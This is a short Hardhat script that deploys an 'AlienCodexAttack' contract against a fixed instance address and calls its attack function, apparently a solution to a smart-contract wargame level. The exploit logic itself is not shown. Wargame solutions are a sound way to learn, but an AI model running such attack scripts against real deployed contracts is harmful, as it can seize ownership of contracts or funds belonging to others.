const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x42D2B1728Cbc2624FC82b61Cca45E7c6483DC010";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("AlienCodexAttack");
  const contract = await Contract.deploy(instanceAddress);
  await contract.deployed();

  // Attack

  let tx = await contract.attack();
  await tx.wait();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
